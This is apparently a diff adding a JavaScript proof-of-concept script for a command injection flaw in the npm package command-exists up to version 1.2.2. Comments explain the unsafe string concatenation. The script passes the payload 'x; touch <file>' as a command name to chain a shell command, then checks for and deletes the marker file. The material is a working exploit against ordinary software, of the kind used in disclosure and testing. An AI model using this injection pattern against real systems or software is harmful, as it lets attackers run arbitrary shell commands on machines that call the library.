@@ -1,0 +1,30 @@
+```javascript
+// Command injection in command-exists <= 1.2.2 (lib/command-exists.js)
+// commandExistsUnix / commandExistsUnixSync build a shell command via string
+// concatenation: 'command -v ' + commandName + ' 2>/dev/null && ...'
+// An attacker-controlled commandName can break out and run arbitrary shell code.
+
+const commandExists = require("command-exists");
+const fs = require("fs");
+const os = require("os");
+const path = require("path");
+
+const marker = path.join(os.tmpdir(), "pwned-" + Date.now() + ".txt");
+
+// Payload escapes the intended "command -v <name>" invocation and chains
+// an arbitrary shell command using `;`.
+const payload = `x; touch ${marker}`;
+
+commandExists(payload)
+  .then(() => finish())
+  .catch(() => finish());
+
+function finish() {
+  if (fs.existsSync(marker)) {
+    console.log("[+] Command injection confirmed! Arbitrary file created at:", marker);
+    fs.unlinkSync(marker);
+  } else {
+    console.log("[-] Injection did not trigger (file not found).");
+  }
+}
+```
